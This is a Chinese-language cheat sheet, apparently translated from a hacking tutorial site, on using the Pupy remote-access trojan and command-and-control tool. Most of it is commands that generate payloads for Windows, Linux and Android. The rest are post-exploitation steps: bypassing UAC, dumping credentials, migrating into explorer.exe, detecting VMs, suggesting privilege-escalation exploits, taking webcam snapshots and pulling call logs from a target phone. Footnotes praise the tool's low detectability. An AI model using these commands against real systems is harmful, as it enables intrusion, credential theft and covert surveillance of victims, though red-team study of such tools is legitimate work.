## 命令与控制工具：Pupy [^2]

### **介绍** [^1]

```bash
git clone https://github.com/n1nj4sec/pupy
ls
./install.sh
cd pupy
pip install -r requirement.txt
./pupysh.ph #运行pupy
./pupygen.py -h #使用pupygen脚本生成有效载荷
```

### **Windows利用**

`./pupygen.py -O windows -A x86 -o /root/Desktop/shell.exe`

### **Windows Post Exploitation**

`msgbox –-title hack "you have been hacked"` 

`rdesktop -r 0` [^3]

`bypassuac -r` [^4]

`creddump` [^5]

`migrate -p explorer.exe -k`

### **Linux利用**

`./pupygen.py -O linux -A x64 -o /root/Desktop.shell`

`check_vm` [^6]

### **Linux Post Exploitation**

`privesc_checker --linenum` [^7]

`exploit_suggester -h`

`exploit_suggester -shell /bin/bash` [^8]

### **Android漏洞利用**

`./pupygen.py -O android -o /root/shell.apk`

### **Android Post Exploitation**

`call -a -output-folder /root/call` [^9]

`webcamsnap -v` [^10]

`apps -a -d` [^11]

[原文](https://www.hackingarticles.in/command-control-tool-pupy/)

---

[^1]: Pupy是一个跨平台的后期开发工具以及一个多功能RAT。它是用python编写的，非常方便。它的可检测性也很低，这就是为什么它是红队的一个很好的工具。Pupy可以使用多个传输进行通信，使用反射注入迁移到进程，并从内存加载远程python代码，python包和python C扩展。它使用一个反射的DLL从内存加载python解释器，这很好，因为磁盘中不会显示任何内容。它没有任何特殊的依赖关系。它还可以迁移到其他进程中。pupy的通信协议是模块化和可堆叠的。它可以同时在多个主机上执行非交互式命令。可以远程访问所有交互式shell。
[^2]: 学习如何利用pupy命令和控制工具来利用Windows，Linux和Android。
[^3]: 使用远程桌面模块使用以下命令访问桌面。执行上述命令后，您可以远程访问桌面 ，使用命令 `http://127.0.0.1:9000/kAu1jxxx`
[^4]: 绕过UAC，这个命令将重新创建具有管理员权限的会话
[^5]: 获取系统的凭据
[^6]: 检查目标计算机是在VM上运行还是主机计算机
[^7]: 获得有关目标系统的详细信息
[^8]: 找到目标系统上正在使用的所有漏洞
[^9]: 获取存储在目标设备上的呼叫日志。**-a：**指获取所有呼叫详细信息 **-output-folder：**指包含呼叫日志的输出文件的路径
[^10]: 目标设备上的主摄像头捕捉。**-v：**指直接查看图像
[^11]: 获取有关目标设备上已安装的软件包或应用程序的信息。**-a：**指获取所有已安装的软件包详细信息 **-d：**查看详细信息